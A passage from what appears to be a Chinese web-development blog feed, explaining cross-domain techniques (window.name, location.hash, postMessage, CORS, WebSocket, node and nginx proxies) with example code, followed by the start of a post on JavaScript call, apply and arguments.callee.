<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当然，这样还是不够的。</span><br><span class="line"></span><br><span class="line">因为规定如果index.html页面和和该页面里的iframe框架的src如果不同源，则也无法操作框架里的任何东西，所以就取不到iframe框架的name值了，告诉你我们不是一家的，你也休想得到我这里的数据。 既然要同源，那就换个src去指，前面说了无论怎样加载window.name值都不会变化，于是我们在index.html相同目录下，新建了个proxy.html的空页面，修改代码如下：</span><br></pre></td></tr></table></figure>
<body>
  <script type="text/javascript"> 
    iframe = document.createElement('iframe'),
    iframe.src = 'http://localhost:8080/data.php';
    document.body.appendChild(iframe);
    iframe.onload = function() {
      iframe.src = 'http://localhost:81/cross-domain/proxy.html';
      console.log(iframe.contentWindow.name)
    };
  </script>
</body>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">理想似乎很美好，在iframe载入过程中，迅速重置iframe.src的指向，使之与index.html同源，那么index页面就能去获取它的name值了！但是现实是残酷的，iframe在现实中的表现是一直不停地刷新， 也很好理解，每次触发onload时间后，重置src，相当于重新载入页面，又触发onload事件，于是就不停地刷新了（但是需要的数据还是能输出的）。修改后代码如下：</span><br></pre></td></tr></table></figure>
<body>
  <script type="text/javascript"> 
    iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    var state = 0;

<pre><code>iframe.onload = function() &#123;
  if(state === 1) &#123;
      var data = JSON.parse(iframe.contentWindow.name);
      console.log(data);
      iframe.contentWindow.document.write(&#39;&#39;);
      iframe.contentWindow.close();
    document.body.removeChild(iframe);
  &#125; else if(state === 0) &#123;
      state = 1;
      iframe.contentWindow.location = &#39;http://localhost:81/cross-domain/proxy.html&#39;;
  &#125;
&#125;;

iframe.src = &#39;http://localhost:8080/data.php&#39;;
document.body.appendChild(iframe);
</code></pre>
<p>  </script></p>
</body>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">所以如上，我们就拿到了服务器返回的数据，但是有几个条件是必不可少的：</span><br><span class="line"></span><br><span class="line">iframe标签的跨域能力</span><br><span class="line">window.names属性值在文档刷新后依然存在的能力</span><br><span class="line">3.4 location.hash + iframe 跨域</span><br><span class="line">此跨域方法和上面介绍的比较类似，一样是动态插入一个iframe然后设置其src为服务端地址，而服务端同样输出一端js代码，也同时通过与子窗口之间的通信来完成数据的传输。</span><br><span class="line"></span><br><span class="line">关于锚点相信大家都已经知道了，其实就是设置锚点，让文档指定的相应的位置。锚点的设置用a标签，然后href指向要跳转到的id，当然，前提是你得有个滚动条，不然也不好滚动嘛是吧。</span><br><span class="line"></span><br><span class="line">而location.hash其实就是url的锚点。比如https:&#x2F;&#x2F;www.geekjc.com#geekjcg的网址打开后，在控制台输入location.hash就会返回#geekjc的字段。</span><br><span class="line"></span><br><span class="line">基础知识补充完毕，下面我们来说下如何实现跨域</span><br><span class="line"></span><br><span class="line">如果index页面要获取远端服务器的数据，动态的插入一个iframe，将iframe的src执行服务器的地址，这时候的top window 和包裹这个iframe的子窗口是不能通信的，因为同源策略，所以改变子窗口的路径就可以了，将数据当做改变后的路径的hash值加载路径上，然后就可以通信了。将数据加在index页面地址的hash上， index页面监听hash的变化，h5的hashchange方法</span><br></pre></td></tr></table></figure>
<body>
  <script type="text/javascript">
    function getData(url, fn) {
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = url;

<pre><code>  iframe.onload = function() &#123;
    fn(iframe.contentWindow.location.hash.substring(1));
    window.location.hash = &#39;&#39;;
    document.body.removeChild(iframe);
  &#125;;

  document.body.appendChild(iframe);
&#125;

// get data from server
var url = &#39;http://localhost:8080/data.php&#39;;
getData(url, function(data) &#123;
  var jsondata = JSON.parse(data);
  console.log(jsondata.name + &#39; &#39; + jsondata.age);
&#125;);
</code></pre>
<p>  </script></p>
</body>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">补充说明：其实location.hash和window.name都是差不多的，都是利用全局对象属性的方法，然后这两种方法和jsonp也是一样的，就是只能够实现get请求</span><br><span class="line"></span><br><span class="line">3.5 postMessage跨域</span><br><span class="line">这是由H5提出来的一个炫酷的API，IE8+，chrome,ff都已经支持实现了这个功能。这个功能也是非常的简单，其中包括接受信息的Message时间，和发送信息的postMessage方法。</span><br><span class="line"></span><br><span class="line">发送信息的postMessage方法是向外界窗口发送信息</span><br><span class="line"></span><br><span class="line">otherWindow.postMessage(message,targetOrigin);</span><br><span class="line">otherWindow指的是目标窗口，也就是要给哪一个window发送消息，是window.frames属性的成员或者是window.open方法创建的窗口。 Message是要发送的消息，类型为String，Object(IE8、9不支持Obj)，targetOrigin是限定消息接受范围，不限制就用星号 *</span><br><span class="line"></span><br><span class="line">接受信息的message事件</span><br></pre></td></tr></table></figure>
var onmessage = function(event) {
  var data = event.data;
  var origin = event.origin;
}

<p>if(typeof window.addEventListener != ‘undefined’){<br>    window.addEventListener(‘message’,onmessage,false);<br>}else if(typeof window.attachEvent != ‘undefined’){<br>    window.attachEvent(‘onmessage’, onmessage);<br>}</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">举个栗子</span><br><span class="line"></span><br><span class="line">a.html(http:&#x2F;&#x2F;www.nealyang.cn&#x2F;a.html)</span><br></pre></td></tr></table></figure>
<iframe id="iframe" src="http://www.neal.cn/b.html" style="display:none;"></iframe>
<script>       
    var iframe = document.getElementById('iframe');
    iframe.onload = function() {
        var data = {
            name: 'aym'
        };
        // 向neal传送跨域数据
        iframe.contentWindow.postMessage(JSON.stringify(data), 'http://www.neal.cn');
    };

<pre><code>// 接受domain2返回数据
window.addEventListener(&#39;message&#39;, function(e) &#123;
    alert(&#39;data from neal ---&gt; &#39; + e.data);
&#125;, false);
</code></pre>
<p></script></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b.html(http:&#x2F;&#x2F;www.neal.cn&#x2F;b.html)</span><br></pre></td></tr></table></figure>
<script>
    // 接收domain1的数据
    window.addEventListener('message', function(e) {
        alert('data from nealyang ---> ' + e.data);

        var data = JSON.parse(e.data);
        if (data) {
            data.number = 16;

            // 处理后再发回nealyang
            window.parent.postMessage(JSON.stringify(data), 'http://www.nealyang.cn');
        }
    }, false);
</script>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3.6 跨域资源共享 CORS</span><br><span class="line">因为是目前主流的跨域解决方案。所以这里多介绍点。</span><br><span class="line"></span><br><span class="line">简介</span><br><span class="line"></span><br><span class="line">CORS是一个W3C标准，全称是&quot;跨域资源共享&quot;（Cross-origin resource sharing）。 它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。</span><br><span class="line"></span><br><span class="line">CORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。IE8+：IE8&#x2F;9需要使用XDomainRequest对象来支持CORS。</span><br><span class="line"></span><br><span class="line">整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。 因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。</span><br><span class="line"></span><br><span class="line">两种请求</span><br><span class="line">说起来很搞笑，分为两种请求，一种是简单请求，另一种是非简单请求。只要满足下面条件就是简单请求</span><br><span class="line"></span><br><span class="line">请求方式为HEAD、POST 或者 GET</span><br><span class="line">http头信息不超出一下字段：Accept、Accept-Language 、 Content-Language、 Last-Event-ID、 Content-Type(限于三个值：application&#x2F;x-www-form-urlencoded、multipart&#x2F;form-data、text&#x2F;plain)</span><br><span class="line">为什么要分为简单请求和非简单请求，因为浏览器对这两种请求方式的处理方式是不同的。</span><br><span class="line">简单请求</span><br><span class="line"></span><br><span class="line">基本流程</span><br><span class="line"></span><br><span class="line">对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。 下面是一个例子，浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个Origin字段。</span><br></pre></td></tr></table></figure>
<p>GET /cors HTTP/1.1<br>Origin: <a href="http://api.bob.com/">http://api.bob.com</a><br>Host: api.alice.com<br>Accept-Language: en-US<br>Connection: keep-alive<br>User-Agent: Mozilla/5.0<br>…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</span><br><span class="line"></span><br><span class="line">如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。 浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。</span><br><span class="line"></span><br><span class="line">注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。</span><br><span class="line"></span><br><span class="line">如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</span><br></pre></td></tr></table></figure>
<p>   Access-Control-Allow-Origin: <a href="http://api.bob.com/">http://api.bob.com</a><br>   Access-Control-Allow-Credentials: true<br>   Access-Control-Expose-Headers: FooBar<br>   Content-Type: text/html; charset=utf-8</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">上面的头信息之中，有三个与CORS请求相关的字段，都以Access-Control-开头</span><br><span class="line"></span><br><span class="line">Access-Control-Allow-Origin :该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求</span><br><span class="line">Access-Control-Allow-Credentials: 该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。</span><br><span class="line">Access-Control-Expose-Headers:该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。</span><br><span class="line"></span><br><span class="line">withCredentials 属性</span><br><span class="line"></span><br><span class="line">上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定Access-Control-Allow-Credentials字段。</span><br><span class="line"></span><br><span class="line">另一方面，开发者必须在AJAX请求中打开withCredentials属性。</span><br></pre></td></tr></table></figure>
<p>var xhr = new XMLHttpRequest(); // IE8/9需用window.XDomainRequest兼容</p>
<p>// 前端设置是否带cookie<br>xhr.withCredentials = true;</p>
<p>xhr.open(‘post’, ‘<a href="http://www.domain2.com:8080/login&#39;">http://www.domain2.com:8080/login&#39;</a>, true);<br>xhr.setRequestHeader(‘Content-Type’, ‘application/x-www-form-urlencoded’);<br>xhr.send(‘user=admin’);</p>
<p>xhr.onreadystatechange = function() {<br>    if (xhr.readyState == 4 &amp;&amp; xhr.status == 200) {<br>        alert(xhr.responseText);<br>    }<br>};</p>
<p>// jquery<br>$.ajax({<br>    …<br>   xhrFields: {<br>       withCredentials: true    // 前端设置是否带cookie<br>   },<br>   crossDomain: true,   // 会让请求头中包含跨域的额外信息，但不会含cookie<br>    …<br>});</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。 但是，如果省略withCredentials设置，有的浏览器还是会一起发送Cookie。这时，可以显式关闭withCredentials。</span><br><span class="line"></span><br><span class="line">需要注意的是，如果要发送Cookie，Access-Control-Allow-Origin就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。</span><br><span class="line"></span><br><span class="line">非简单请求</span><br><span class="line"></span><br><span class="line">非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application&#x2F;json。</span><br><span class="line"></span><br><span class="line">非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为&quot;预检&quot;请求（preflight）。</span><br><span class="line"></span><br><span class="line">浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。</span><br></pre></td></tr></table></figure>
<p>var url = ‘<a href="http://api.alice.com/cors&#39;">http://api.alice.com/cors&#39;</a>;<br>var xhr = new XMLHttpRequest();<br>xhr.open(‘PUT’, url, true);<br>xhr.setRequestHeader(‘X-Custom-Header’, ‘value’);<br>xhr.send();<br>浏览器发现，这是一个非简单请求，就自动发出一个”预检”请求，要求服务器确认可以这样请求。下面是这个”预检”请求的HTTP头信息。</p>
<p>  OPTIONS /cors HTTP/1.1<br>   Origin: <a href="http://api.bob.com/">http://api.bob.com</a><br>   Access-Control-Request-Method: PUT<br>   Access-Control-Request-Headers: X-Custom-Header<br>   Host: api.alice.com<br>   Accept-Language: en-US<br>   Connection: keep-alive<br>   User-Agent: Mozilla/5.0…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;预检&quot;请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。</span><br><span class="line"></span><br><span class="line">除了Origin字段，&quot;预检&quot;请求的头信息包括两个特殊字段。</span><br><span class="line"></span><br><span class="line">Access-Control-Request-Method：该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。</span><br><span class="line">Access-Control-Request-Headers：该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header</span><br><span class="line">预检请求的回应</span><br><span class="line"></span><br><span class="line">服务器收到&quot;预检&quot;请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应</span><br></pre></td></tr></table></figure>
<p>HTTP/1.1 200 OK<br>Date: Mon, 01 Dec 2008 01:15:39 GMT<br>Server: Apache/2.0.61 (Unix)<br>Access-Control-Allow-Origin: <a href="http://api.bob.com/">http://api.bob.com</a><br>Access-Control-Allow-Methods: GET, POST, PUT<br>Access-Control-Allow-Headers: X-Custom-Header<br>Content-Type: text/html; charset=utf-8<br>Content-Encoding: gzip<br>Content-Length: 0<br>Keep-Alive: timeout=2, max=100<br>Connection: Keep-Alive<br>Content-Type: text/plain</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">上面的HTTP回应中，关键的是Access-Control-Allow-Origin字段，表示http:&#x2F;&#x2F;api.bob.com可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</span><br><span class="line"></span><br><span class="line">如果浏览器否定了&quot;预检&quot;请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。</span><br><span class="line"></span><br><span class="line">服务器回应的其他CORS相关字段如下：</span><br></pre></td></tr></table></figure>
<p>Access-Control-Allow-Methods: GET, POST, PUT<br>Access-Control-Allow-Headers: X-Custom-Header<br>Access-Control-Allow-Credentials: true<br>Access-Control-Max-Age: 1728000</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Methods：该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次&quot;预检&quot;请求。</span><br><span class="line">Access-Control-Allow-Headers：如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在&quot;预检&quot;中请求的字段。</span><br><span class="line">Access-Control-Allow-Credentials： 该字段与简单请求时的含义相同。</span><br><span class="line">Access-Control-Max-Age： 该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。</span><br><span class="line">浏览器正常请求回应</span><br><span class="line"></span><br><span class="line">一旦服务器通过了&quot;预检&quot;请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段。</span><br></pre></td></tr></table></figure>
<p>PUT /cors HTTP/1.1<br>Origin: <a href="http://api.bob.com/">http://api.bob.com</a><br>Host: api.alice.com<br>X-Custom-Header: value<br>Accept-Language: en-US<br>Connection: keep-alive<br>User-Agent: Mozilla/5.0…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">浏览器的正常CORS请求。上面头信息的Origin字段是浏览器自动添加的。下面是服务器正常的回应。</span><br></pre></td></tr></table></figure>
<p>Access-Control-Allow-Origin: <a href="http://api.bob.com/">http://api.bob.com</a><br>Content-Type: text/html; charset=utf-8<br>Access-Control-Allow-Origin字段是每次回应都必定包含的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">结束语</span><br><span class="line"></span><br><span class="line">CORS与JSONP的使用目的相同，但是比JSONP更强大。JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</span><br><span class="line"></span><br><span class="line">3.7 WebSocket协议跨域</span><br><span class="line">WebSocket protocol是HTML5一种新的协议。它实现了浏览器与服务器全双工通信，同时允许跨域通讯，是server push技术的一种很好的实现。</span><br><span class="line"></span><br><span class="line">原生WebSocket API使用起来不太方便，我们使用Socket.io，它很好地封装了webSocket接口，提供了更简单、灵活的接口，也对不支持webSocket的浏览器提供了向下兼容。</span><br><span class="line"></span><br><span class="line">前端代码：</span><br></pre></td></tr></table></figure>
<div>user input：<input type="text"></div>
<script src="./socket.io.js"></script>
<script>
var socket = io('http://www.domain2.com:8080');

<p>// 连接成功处理<br>socket.on(‘connect’, function() {<br>    // 监听服务端消息<br>    socket.on(‘message’, function(msg) {<br>        console.log(‘data from server: —&gt; ‘ + msg);<br>    });</p>
<pre><code>// 监听服务端关闭
socket.on(&#39;disconnect&#39;, function() &#123; 
    console.log(&#39;Server socket has closed.&#39;); 
&#125;);
</code></pre>
<p>});</p>
<p>document.getElementsByTagName(‘input’)[0].onblur = function() {<br>    socket.send(this.value);<br>};<br></script><br>node Server</p>
<p>var http = require(‘http’);<br>var socket = require(‘socket.io’);</p>
<p>// 启http服务<br>var server = http.createServer(function(req, res) {<br>    res.writeHead(200, {<br>        ‘Content-type’: ‘text/html’<br>    });<br>    res.end();<br>});</p>
<p>server.listen(‘8080’);<br>console.log(‘Server is running at port 8080…’);</p>
<p>// 监听socket连接<br>socket.listen(server).on(‘connection’, function(client) {<br>    // 接收信息<br>    client.on(‘message’, function(msg) {<br>        client.send(‘hello：’ + msg);<br>        console.log(‘data from client: —&gt; ‘ + msg);<br>    });</p>
<pre><code>// 断开处理
client.on(&#39;disconnect&#39;, function() &#123;
    console.log(&#39;Client socket has closed.&#39;); 
&#125;);
</code></pre>
<p>});</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3.8 node代理跨域</span><br><span class="line">node中间件实现跨域代理，是通过启一个代理服务器，实现数据的转发，也可以通过设置cookieDomainRewrite参数修改响应头中cookie中域名，实现当前域的cookie写入，方便接口登录认证。</span><br><span class="line"></span><br><span class="line">利用node + express + http-proxy-middleware搭建一个proxy服务器</span><br><span class="line"></span><br><span class="line">前端代码</span><br></pre></td></tr></table></figure>
<p>var xhr = new XMLHttpRequest();</p>
<p>// 前端开关：浏览器是否读写cookie<br>xhr.withCredentials = true;</p>
<p>// 访问http-proxy-middleware代理服务器<br>xhr.open(‘get’, ‘<a href="http://www.domain1.com:3000/login?user=admin&#39;">http://www.domain1.com:3000/login?user=admin&#39;</a>, true);<br>xhr.send();<br>后端代码</p>
<p>var express = require(‘express’);<br>var proxy = require(‘http-proxy-middleware’);<br>var app = express();</p>
<p>app.use(‘/‘, proxy({<br>    // 代理跨域目标接口<br>    target: ‘<a href="http://www.domain2.com:8080&#39;">http://www.domain2.com:8080&#39;</a>,<br>    changeOrigin: true,</p>
<pre><code>// 修改响应头信息，实现跨域并允许带cookie
onProxyRes: function(proxyRes, req, res) &#123;
    res.header(&#39;Access-Control-Allow-Origin&#39;, &#39;http://www.domain1.com&#39;);
    res.header(&#39;Access-Control-Allow-Credentials&#39;, &#39;true&#39;);
&#125;,

// 修改响应信息中的cookie域名
cookieDomainRewrite: &#39;www.domain1.com&#39;  // 可以为false，表示不修改
</code></pre>
<p>}));</p>
<p>app.listen(3000);<br>console.log(‘Proxy server is listen at port 3000…’);</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3.9 nginx代理跨域</span><br><span class="line">1、 nginx配置解决iconfont跨域</span><br><span class="line">浏览器跨域访问js、css、img等常规静态资源被同源策略许可，但iconfont字体文件(eot|otf|ttf|woff|svg)例外，此时可在nginx的静态资源服务器中加入以下配置。</span><br></pre></td></tr></table></figure>
<p>location / {<br>  add_header Access-Control-Allow-Origin *;<br>}</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2、 nginx反向代理接口跨域</span><br><span class="line">跨域原理： 同源策略是浏览器的安全策略，不是HTTP协议的一部分。服务器端调用HTTP接口只是使用HTTP协议，不会执行JS脚本，不需要同源策略，也就不存在跨越问题。</span><br><span class="line"></span><br><span class="line">实现思路：通过nginx配置一个代理服务器（域名与domain1相同，端口不同）做跳板机，反向代理访问domain2接口，并且可以顺便修改cookie中domain信息，方便当前域cookie写入，实现跨域登录。</span><br><span class="line"></span><br><span class="line">nginx具体配置：</span><br></pre></td></tr></table></figure>
<p>#proxy服务器<br>server {<br>    listen       81;<br>    server_name  <a href="http://www.domain1.com/">www.domain1.com</a>;</p>
<pre><code>location / &#123;
    proxy_pass   http://www.domain2.com:8080;  #反向代理
    proxy_cookie_domain www.domain2.com www.domain1.com; #修改cookie里域名
    index  index.html index.htm;

    # 当用webpack-dev-server等中间件代理接口访问nignx时，此时无浏览器参与，故没有同源限制，下面的跨域配置可不启用
    add_header Access-Control-Allow-Origin http://www.domain1.com;  #当前端只跨域不带cookie时，可为*
    add_header Access-Control-Allow-Credentials true;
&#125;
</code></pre>
<p>}</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.) 前端代码示例：</span><br></pre></td></tr></table></figure>
<p>var xhr = new XMLHttpRequest();</p>
<p>// 前端开关：浏览器是否读写cookie<br>xhr.withCredentials = true;</p>
<p>// 访问nginx中的代理服务器<br>xhr.open(‘get’, ‘<a href="http://www.domain1.com:81/?user=admin&#39;">http://www.domain1.com:81/?user=admin&#39;</a>, true);<br>xhr.send();</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2.) Nodejs后台示例：</span><br></pre></td></tr></table></figure>
<p>var http = require(‘http’);<br>var server = http.createServer();<br>var qs = require(‘querystring’);</p>
<p>server.on(‘request’, function(req, res) {<br>    var params = qs.parse(req.url.substring(2));</p>
<pre><code>// 向前台写cookie
res.writeHead(200, &#123;
    &#39;Set-Cookie&#39;: &#39;l=a123456;Path=/;Domain=www.domain2.com;HttpOnly&#39;   // HttpOnly:脚本无法读取
&#125;);

res.write(JSON.stringify(params));
res.end();
</code></pre>
<p>});</p>
<p>server.listen(‘8080’);<br>console.log(‘Server is running at port 8080…’);</p>
<pre><code>
</code></pre>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>Javascript函数式编程要掌握的知识点讲解</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/Javascript%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E8%A6%81%E6%8E%8C%E6%8F%A1%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B2%E8%A7%A3/</url>
    <content><![CDATA[<p><strong>一：理解call和apply 及arguments.callee</strong></p>
<p>ECMAScript3给Function的原型定义了两个方法，他们是<code>Function.prototype.call</code> 和 <code>Function.prototype.apply</code>. 其实他们的作用是一样的，只是传递的参数不一样而已；</p>
<p><strong>1. apply;</strong> 接受2个参数，第一个参数指定了函数体内this对象的指向，第二个参数为一个类似数组的集合，比如如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var yunxi &#x3D; function(a,b)&#123;</span><br><span class="line"></span><br><span class="line">   console.log([a,b]); &#x2F;&#x2F; [1,2]</span><br><span class="line"></span><br><span class="line">   console.log(this &#x3D;&#x3D;&#x3D; window); &#x2F;&#x2F; true</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">yunxi.apply(null,[1,2]);</span><br></pre></td></tr></table></figure>

<p>如上代码，我们第一个参数传入null，函数体内默认会指向与宿主对象，即window对象；因此我们可以在yunxi函数内打印下值为true即可看到：</p>
<p>下面我们来看看使用call方法的实例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var yunxi &#x3D; function(a,b)&#123;</span><br><span class="line"></span><br><span class="line">   console.log([a,b]); &#x2F;&#x2F; [1,2]</span><br><span class="line"></span><br><span class="line">   console.log(this &#x3D;&#x3D;&#x3D; window); &#x2F;&#x2F; true</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">yunxi.call(null,1,2);</span><br></pre></td></tr></table></figure>

<p>可以看到 call方法的第二个参数是以逗号隔开的参数；</p>
<p><strong>那么call和apply用在什么地方呢？</strong></p>
<p>1.call和apply 最常见的用途是改变函数体内的this指向，如下代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var longen &#x3D; &#123;</span><br><span class="line">    name:&#39;yunxi&#39;</span><br><span class="line">&#125;;</span><br><span class="line">var longen2 &#x3D; &#123;</span><br><span class="line">    name: &#39;我叫涂根华&#39;</span><br><span class="line">&#125;;</span><br><span class="line">var name &#x3D; &quot;我是来测试的&quot;;</span><br><span class="line">var getName &#x3D; function()&#123;</span><br><span class="line">    return this.name;</span><br><span class="line">&#125;;</span><br><span class="line">console.log(getName()); &#x2F;&#x2F; 打印 &quot;我是来测试的&quot;;</span><br><span class="line">console.log(getName.call(longen)); &#x2F;&#x2F; 打印 yunxi</span><br><span class="line">console.log(getName.call(longen2)); &#x2F;&#x2F; 打印 &quot;我叫涂根华&quot;</span><br></pre></td></tr></table></figure>

<p>第一次调用 <code>getName()</code>方法，因为它是普通函数调用，所以它的this指向与window，因此打印出全局对象的name的值；</p>
<p>第二次调用<code>getName.call(longen);</code>执行这句代码后，getName这个方法的内部指针this指向于longen这个对象了，因此打印<code>this.name</code>实际上是longen.name，因此返回的是<code>name=”yunxi”;</code></p>
<p>但是this指针也有列外的情况，比如一个点击元素，当我们点击一个元素的时候，this指针就指向与那个点击元素，但是当我们在内部再包含一个函数后，在函数内再继续调用this的话，那么现在的this指针就指向了window了；比如如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.getElementById(&quot;longen&quot;).onclick &#x3D; function()&#123;</span><br><span class="line">    console.log(this); &#x2F;&#x2F; this 就指向于div元素对象了</span><br><span class="line">    var func &#x3D; function()&#123;</span><br><span class="line">        console.log(this); &#x2F;&#x2F; 打印出window对象</span><br><span class="line">    &#125;</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上代码。可以看到外部this指向与被点击的那个元素，内部普通函数调用，this指针都是指向于window对象。但是我们可以使用call或者apply方法来改变this的指针的；如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.getElementById(&quot;longen&quot;).onclick &#x3D; function()&#123;</span><br><span class="line">    console.log(this); &#x2F;&#x2F; this 就指向于div元素对象了</span><br><span class="line">    var func &#x3D; function()&#123;</span><br><span class="line">        console.log(this); &#x2F;&#x2F; 就指向于div元素对象了</span><br><span class="line">    &#125;</span><br><span class="line">    func.call(this);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上代码我们使用call方法调用func函数，使this指向与func这个对象了，当然上面的方法我们还可以不使用call或者apply方法来改变this的指针，我们可以在外部先使用一个变量来保存this的指针，在内部调用的时候我们可以使用哪个变量即可，如下代码演示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.getElementById(&quot;longen&quot;).onclick &#x3D; function()&#123;</span><br><span class="line">    console.log(this); &#x2F;&#x2F; this 就指向于div元素对象了</span><br><span class="line">    var self &#x3D; this;</span><br><span class="line">    var func &#x3D; function()&#123;</span><br><span class="line">        console.log(self); &#x2F;&#x2F; 就指向于div元素对象了</span><br><span class="line">    &#125;</span><br><span class="line">    func();</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p><strong>arguments.callee的理解</strong></p>
<p>callee是arguments的一个属性，它可以被用作当前函数或函数体执行的环境中，或者说调用一个匿名函数；返回的是当前正在被执行的Function对象；简单的来说就是当前执行环境的函数被调用时候，arguments.callee对象会指向与自身，就是当前的那个函数的引用；</p>
<p>如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var count &#x3D; 1;</span><br><span class="line">var test &#x3D; function() &#123;</span><br><span class="line">    console.log(count + &quot; -- &quot; + (test.length &#x3D;&#x3D; arguments.callee.length) );</span><br><span class="line">    &#x2F;&#x2F; 打印出 1 -- true 2 -- true  3 -- true </span><br><span class="line">    if (count++ &lt; 3) &#123;</span><br><span class="line">        &#x2F;&#x2F; 调用test()函数自身</span><br><span class="line">        arguments.callee();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">test();</span><br></pre></td></tr></table></figure>

